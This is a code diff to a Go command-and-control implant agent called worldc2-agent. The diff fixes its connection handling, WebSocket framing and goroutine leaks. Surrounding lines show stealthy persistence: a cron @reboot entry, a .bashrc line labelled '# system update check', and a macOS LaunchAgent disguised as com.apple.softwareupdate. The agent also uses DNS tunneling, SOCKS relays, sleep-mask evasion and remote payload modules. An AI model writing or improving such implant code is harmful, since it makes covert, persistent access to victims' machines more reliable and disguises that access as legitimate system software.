@@ -9,6 +9,7 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -28,11 +29,11 @@ import (
 
 // Agent is the client-side implant.
 type Agent struct {
-	serverAddr  string
-	agentID     string
-	agentVer    string
+	serverAddr string
+	agentID    string
+	agentVer   string
 
-	conn        net.Conn
+	conn net.Conn
 
 	// Crypto
 	kp           *crypto.KeyPair
@@ -42,21 +43,21 @@ type Agent struct {
 	serverPub    [crypto.KeySize]byte
 
 	// State
-	running         bool
-	seqRx           uint32
-	seqTx           uint32
-	backoffBase     time.Duration
-	backoffCurrent  time.Duration
-	backoffMax      time.Duration
+	running        bool
+	seqRx          uint32
+	seqTx          uint32
+	backoffBase    time.Duration
+	backoffCurrent time.Duration
+	backoffMax     time.Duration
 
 	// Tunnels (SOCKS5 / PortFwd relay)
-	tunnels     map[string]net.Conn
-	tunnelsMu   sync.Mutex
-	writeMu     sync.Mutex
+	tunnels   map[string]net.Conn
+	tunnelsMu sync.Mutex
+	writeMu   sync.Mutex
 
 	// Modules
-	modules     *ModuleRegistry
-	dynModules  map[string]*DynamicModule
+	modules    *ModuleRegistry
+	dynModules map[string]*DynamicModule
 
 	// Evasion
 	evasive    bool
@@ -74,20 +75,20 @@ type Agent struct {
 // New creates a new agent.
 func New(serverAddr string) *Agent {
 	return &Agent{
-		serverAddr:      serverAddr,
-		agentID:         generateAgentID(),
-		agentVer:        "2.0.0",
-		backoffBase:     1 * time.Second,
-		backoffCurrent:  1 * time.Second,
-		backoffMax:      5 * time.Minute,
+		serverAddr:     serverAddr,
+		agentID:        generateAgentID(),
+		agentVer:       "2.0.0",
+		backoffBase:    1 * time.Second,
+		backoffCurrent: 1 * time.Second,
+		backoffMax:     5 * time.Minute,
 		evasive:        false,
 		jitterBase:     5 * time.Second,
 		sleepMask:      evasion.NewSleepMask(),
-		tunnels:         make(map[string]net.Conn),
-		modules:         NewModuleRegistry(),
-		dynModules:      make(map[string]*DynamicModule),
-		tasks:           make(chan *proto.Task, 256),
-		results:         make(chan *proto.TaskResult, 256),
+		tunnels:        make(map[string]net.Conn),
+		modules:        NewModuleRegistry(),
+		dynModules:     make(map[string]*DynamicModule),
+		tasks:          make(chan *proto.Task, 256),
+		results:        make(chan *proto.TaskResult, 256),
 	}
 }
 
@@ -134,15 +135,20 @@ func (a *Agent) Run() error {
 
 		log.Printf("[AGENT] Session established with %s", a.serverAddr)
 
-		// Start heartbeat and task processor
-		go a.heartbeatLoop()
-		go a.taskProcessor()
-		go a.resultSender()
+		// Per-connection lifecycle: the helper loops below exit when
+		// connDone is closed. Before this fix every reconnect leaked the
+		// previous generation of goroutines (they ranged over the shared
+		// channels forever and wrote through the new connection).
+		connDone := make(chan struct{})
+		go a.heartbeatLoop(connDone)
+		go a.taskProcessor(connDone)
+		go a.resultSender(connDone)
 
 		// Message loop (blocks until disconnect)
 		err := a.messageLoop()
 
 		a.conn.Close()
+		close(connDone)
 
 		if err != nil {
 			log.Printf("[AGENT] Connection lost: %v", err)
@@ -324,9 +330,10 @@ type wsFrameWriter struct {
 
 func (r *wsFrameReader) Read(b []byte) (int, error) {
 	for r.offset >= r.length {
-		// Read frame header (2 bytes minimum)
+		// Read frame header (2 bytes minimum). io.ReadFull is required:
+		// TCP fragmentation routinely splits these small reads.
 		header := make([]byte, 2)
-		if _, err := r.conn.Read(header); err != nil {
+		if _, err := io.ReadFull(r.conn, header); err != nil {
 			return 0, err
 		}
 
@@ -341,23 +348,33 @@ func (r *wsFrameReader) Read(b []byte) (int, error) {
 
 		if payloadLen == 126 {
 			ext := make([]byte, 2)
-			r.conn.Read(ext)
+			if _, err := io.ReadFull(r.conn, ext); err != nil {
+				return 0, err
+			}
 			payloadLen = int(ext[0])<<8 | int(ext[1])
 		} else if payloadLen == 127 {
 			ext := make([]byte, 8)
-			r.conn.Read(ext)
+			if _, err := io.ReadFull(r.conn, ext); err != nil {
+				return 0, err
+			}
 			payloadLen = int(ext[4])<<24 | int(ext[5])<<16 | int(ext[6])<<8 | int(ext[7])
 		}
 
 		// Read mask key if present
 		var maskKey [4]byte
 		if masked {
-			r.conn.Read(maskKey[:])
+			if _, err := io.ReadFull(r.conn, maskKey[:]); err != nil {
+				return 0, err
+			}
 		}
 
 		// Read payload
 		r.buf = make([]byte, payloadLen)
-		r.conn.Read(r.buf)
+		if payloadLen > 0 {
+			if _, err := io.ReadFull(r.conn, r.buf); err != nil {
+				return 0, err
+			}
+		}
 
 		// Unmask if needed
 		if masked {
@@ -376,22 +393,31 @@ func (r *wsFrameReader) Read(b []byte) (int, error) {
 }
 
 func (w *wsFrameWriter) Write(b []byte) (int, error) {
-	// WebSocket frame: FIN=1, opcode=2 (binary), no mask
+	// RFC 6455: all client-to-server frames MUST be masked.
+	var maskKey [4]byte
+	if _, err := rand.Read(maskKey[:]); err != nil {
+		return 0, fmt.Errorf("generate ws mask: %w", err)
+	}
+
 	frame := make([]byte, 0, 14+len(b))
 	frame = append(frame, 0x82) // FIN + binary opcode
 
 	if len(b) < 126 {
-		frame = append(frame, byte(len(b)))
+		frame = append(frame, 0x80|byte(len(b))) // MASK bit set
 	} else if len(b) < 65536 {
-		frame = append(frame, 126, byte(len(b)>>8), byte(len(b)))
+		frame = append(frame, 0x80|126, byte(len(b)>>8), byte(len(b)))
 	} else {
-		frame = append(frame, 127)
+		frame = append(frame, 0x80|127)
 		for i := 7; i >= 0; i-- {
 			frame = append(frame, byte(len(b)>>(i*8)))
 		}
 	}
+	frame = append(frame, maskKey[:]...)
 
-	frame = append(frame, b...)
+	// Append the masked payload
+	for i := 0; i < len(b); i++ {
+		frame = append(frame, b[i]^maskKey[i%4])
+	}
 	return w.conn.Write(frame)
 }
 
@@ -467,14 +493,14 @@ func dialWebSocket(host, port string) (net.Conn, error) {
 
 // dnsConn implements net.Conn for DNS tunneling.
 type dnsConn struct {
-	conn     *net.UDPConn
-	server   *net.UDPAddr
-	domain   string
+	conn      *net.UDPConn
+	server    *net.UDPAddr
+	domain    string
 	sessionID string
-	upBuf    []byte
-	downBuf  []byte
-	upOff    int
-	downOff  int
+	upBuf     []byte
+	downBuf   []byte
+	upOff     int
+	downOff   int
 }
 
 func (c *dnsConn) Read(b []byte) (int, error) {
@@ -665,10 +691,10 @@ func (a *Agent) performKeyExchange() error {
 	}
 
 	rawInner := &proto.EnvelopeInner{
-		Id:          1,
-		Type:        proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
-		Timestamp:   uint64(time.Now().UnixNano()),
-		Payload:     &proto.EnvelopeInner_KeyExchange{KeyExchange: agentKE},
+		Id:        1,
+		Type:      proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
+		Timestamp: uint64(time.Now().UnixNano()),
+		Payload:   &proto.EnvelopeInner_KeyExchange{KeyExchange: agentKE},
 	}
 
 	innerBytes, _ := protobuf.Marshal(rawInner)
@@ -747,10 +773,10 @@ func (a *Agent) sendSessionInit() error {
 	}
 
 	rawInner := &proto.EnvelopeInner{
-		Id:          3,
-		Type:        proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
-		Timestamp:   uint64(time.Now().UnixNano()),
-		Payload:     &proto.EnvelopeInner_SessionInit{SessionInit: init},
+		Id:        3,
+		Type:      proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
+		Timestamp: uint64(time.Now().UnixNano()),
+		Payload:   &proto.EnvelopeInner_SessionInit{SessionInit: init},
 	}
 
 	innerBytes, _ := protobuf.Marshal(rawInner)
@@ -815,40 +841,57 @@ func (a *Agent) messageLoop() error {
 	return nil
 }
 
-func (a *Agent) heartbeatLoop() {
+func (a *Agent) heartbeatLoop(done <-chan struct{}) {
 	jitterBytes := make([]byte, 8)
 	rand.Read(jitterBytes)
 	jitterSec := 25 + int(binary.BigEndian.Uint64(jitterBytes)%10)
 	ticker := time.NewTicker(time.Duration(jitterSec) * time.Second)
 	defer ticker.Stop()
 
-	for a.running {
+	for {
 		select {
+		case <-done:
+			return
 		case <-ticker.C:
 			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT,
 				&proto.Heartbeat{Timestamp: uint64(time.Now().UnixNano())})
-		case <-time.After(100 * time.Millisecond):
 		}
 	}
 }
 
-func (a *Agent) taskProcessor() {
-	for task := range a.tasks {
-		if !a.running {
+func (a *Agent) taskProcessor(done <-chan struct{}) {
+	for {
+		select {
+		case <-done:
 			return
+		case task, ok := <-a.tasks:
+			if !ok {
+				return
+			}
+			if !a.running {
+				return
+			}
+			result := a.executeTask(task)
+			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
 		}
-		result := a.executeTask(task)
-		a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
 	}
 }
 
-func (a *Agent) resultSender() {
-	for result := range a.results {
-		if !a.running {
+func (a *Agent) resultSender(done <-chan struct{}) {
+	for {
+		select {
+		case <-done:
 			return
+		case result, ok := <-a.results:
+			if !ok {
+				return
+			}
+			if !a.running {
+				return
+			}
+			log.Printf("[AGENT] resultSender: sending %s", result.TaskId)
+			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
 		}
-		log.Printf("[AGENT] resultSender: sending %s", result.TaskId)
-		a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
 	}
 }
 
@@ -986,8 +1029,8 @@ func (a *Agent) handleTunnelOpen(cmd string) *proto.TaskResult {
 	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
 	if err != nil {
 		return &proto.TaskResult{
-			TaskId: "tun-open-" + id,
-			Output: fmt.Sprintf("tunnel_err:%s:%v", id, err),
+			TaskId:  "tun-open-" + id,
+			Output:  fmt.Sprintf("tunnel_err:%s:%v", id, err),
 			Success: false, ErrorMessage: err.Error(),
 		}
 	}
@@ -1253,11 +1296,11 @@ func (a *Agent) handleModuleLoad(cmd string) *proto.TaskResult {
 
 	var packed struct {
 		Manifest struct {
-			Name        string `json:"name"`
-			Version     string `json:"version"`
-			Platform    string `json:"platform"`
-			Description string `json:"description"`
-			Type        string `json:"type"`
+			Name        string   `json:"name"`
+			Version     string   `json:"version"`
+			Platform    string   `json:"platform"`
+			Description string   `json:"description"`
+			Type        string   `json:"type"`
 			Commands    []string `json:"commands"`
 		} `json:"manifest"`
 		Payload string `json:"payload"`
@@ -1430,11 +1473,11 @@ func (a *Agent) autoPersist() {
 func (a *Agent) persistLinuxCron(exePath, serverAddr string) {
 	cronLine := fmt.Sprintf("@reboot %s --server %s >/dev/null 2>&1 &", exePath, serverAddr)
 	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".bty_cron_%d", time.Now().Unix()))
-	
+
 	// Get existing crontab
 	existing, _ := exec.Command("crontab", "-l").CombinedOutput()
 	content := string(existing)
-	
+
 	// Add our line if not present
 	if !containsStr(content, "worldc2-agent") {
 		if content != "" && !strings.HasSuffix(strings.TrimSpace(content), "\n") {
@@ -1442,7 +1485,7 @@ func (a *Agent) persistLinuxCron(exePath, serverAddr string) {
 		}
 		content += cronLine + "\n"
 	}
-	
+
 	os.WriteFile(tmpFile, []byte(content), 0600)
 	exec.Command("crontab", tmpFile).Run()
 	os.Remove(tmpFile)
@@ -1452,12 +1495,12 @@ func (a *Agent) persistLinuxCron(exePath, serverAddr string) {
 func (a *Agent) persistLinuxBashrc(exePath, serverAddr string) {
 	bashrc := os.ExpandEnv("$HOME/.bashrc")
 	line := fmt.Sprintf("\n# system update check\nnohup %s --server %s >/dev/null 2>&1 &\n", exePath, serverAddr)
-	
+
 	data, err := os.ReadFile(bashrc)
 	if err != nil {
 		return
 	}
-	
+
 	if !containsStr(string(data), "worldc2-agent") {
 		f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
 		if err == nil {
@@ -1491,7 +1534,7 @@ func (a *Agent) persistWindowsScheduledTask(exePath, serverAddr string) {
 func (a *Agent) persistDarwinLaunchAgent(exePath, serverAddr string) {
 	launchDir := os.ExpandEnv("$HOME/Library/LaunchAgents")
 	os.MkdirAll(launchDir, 0755)
-	
+
 	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -1503,7 +1546,7 @@ func (a *Agent) persistDarwinLaunchAgent(exePath, serverAddr string) {
     <key>StartInterval</key><integer>3600</integer>
 </dict>
 </plist>`, exePath, serverAddr)
-	
+
 	plistFile := filepath.Join(launchDir, "com.apple.softwareupdate.plist")
 	os.WriteFile(plistFile, []byte(plistContent), 0644)
 	exec.Command("launchctl", "load", plistFile).Run()
